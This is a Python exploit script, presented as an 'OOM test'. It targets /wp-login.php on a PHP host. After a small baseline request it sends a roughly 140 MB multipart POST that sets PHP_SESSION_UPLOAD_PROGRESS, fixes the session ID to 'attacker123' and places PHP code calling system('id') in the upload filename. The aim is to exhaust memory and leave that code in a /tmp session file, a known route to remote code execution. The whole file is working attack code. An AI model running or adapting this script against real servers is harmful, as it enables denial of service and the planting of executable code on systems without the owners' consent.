#!/usr/bin/env python3
"""Test OOM trigger with post_max_size > memory_limit."""
import os, socket, ssl, threading, time, sys

HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
PORT = int(os.environ.get("TARGET_PORT", "443"))
SID  = "attacker123"
PHP  = "<?php system('id');die(); ?>"

def multipart(parts, bnd):
    buf = bytearray()
    for p in parts:
        nm = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        dt = p["data"].encode() if isinstance(p["data"], str) else p["data"]
        buf += b"--" + bnd + b"\r\n"
        buf += b'Content-Disposition: form-data; name="' + nm + b'"'
        if "filename" in p:
            fn = p["filename"].encode() if isinstance(p["filename"], str) else p["filename"]
            buf += b'; filename="' + fn + b'"'
            buf += b"\r\nContent-Type: application/octet-stream"
        buf += b"\r\n\r\n" + dt + b"\r\n"
    buf += b"--" + bnd + b"--\r\n"
    return bytes(buf)

def https_req(method, path, body=None, bnd=None, cookie=None, timeout=180):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw_sock = socket.create_connection((HOST, PORT), timeout=30)
    sock = ctx.wrap_socket(raw_sock, server_hostname=HOST)
    sock.settimeout(timeout)

    headers = f"{method} {path} HTTP/1.1\r\nHost: {HOST}\r\n"
    if cookie:
        headers += f"Cookie: {cookie}\r\n"
    if body:
        headers += f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
        headers += f"Content-Length: {len(body)}\r\n"
    headers += "Connection: close\r\n\r\n"

    data = bytearray()
    def rx():
        try:
            while True:
                c = sock.recv(65536)
                if not c:
                    break
                data.extend(c)
        except Exception:
            pass
    t = threading.Thread(target=rx, daemon=True)
    t.start()
    try:
        sock.sendall(headers.encode())
        if body:
            sent = 0
            chunk = 262144
            for off in range(0, len(body), chunk):
                sock.sendall(body[off:off + chunk])
                sent += min(chunk, len(body) - off)
                if sent % (10 * 1024 * 1024) == 0:
                    print(f"    sent {sent // (1024*1024)} MB ...", flush=True)
    except (BrokenPipeError, ConnectionResetError, ssl.SSLError) as e:
        print(f"    connection error during send: {e}")
    t.join(timeout=timeout + 1)
    sock.close()
    return bytes(data)

def resp_status(raw):
    if not raw:
        return "(empty/connection reset)"
    return raw.split(b"\r\n", 1)[0].decode("latin1")

print("=" * 60)
print(f"OOM test on {HOST}:{PORT}")
print(f"post_max_size=256M, memory_limit=128M")
print(f"SID={SID}, payload in filename")
print("=" * 60)

# Step 1: Normal small request baseline
print("\n[1] baseline: small POST to /wp-login.php ...")
small_body = multipart([
    {"name": "log", "data": "test"},
], b"BASE")
r = https_req("POST", "/wp-login.php", small_body, b"BASE")
print(f"    status: {resp_status(r)}")
print(f"    response size: {len(r)} bytes")

# Step 2: OOM trigger - send >128MB multipart with session upload progress
print(f"\n[2] OOM trigger: ~140MB multipart POST ...")
print(f"    PHP code in filename: {PHP}")
oom_body = multipart([
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": "pwn"},
    {"name": "f", "filename": PHP, "data": b"A" * 64},
    {"name": "pad1", "data": b"B" * (70 * 1024 * 1024)},
    {"name": "pad2", "data": b"C" * (70 * 1024 * 1024)},
], b"BOOM")
print(f"    body size: {len(oom_body) / (1024*1024):.1f} MB")
t0 = time.time()
r2 = https_req("POST", "/wp-login.php", oom_body, b"BOOM",
               cookie=f"PHPSESSID={SID}")
elapsed = time.time() - t0
print(f"    status: {resp_status(r2)}")
print(f"    response size: {len(r2)} bytes")
print(f"    elapsed: {elapsed:.1f}s")

if len(r2) == 0 or b"500" in r2[:50]:
    print("    → likely OOM (empty response or 500)")
    print("    → session file /tmp/sess_attacker123 should be preserved")
elif b"200" in r2[:50] or b"302" in r2[:50]:
    print("    → normal response, OOM may not have triggered")
    print("    → check if memory_limit > post_max_size")
else:
    print(f"    → unexpected: {r2[:200]}")

print("\n" + "=" * 60)
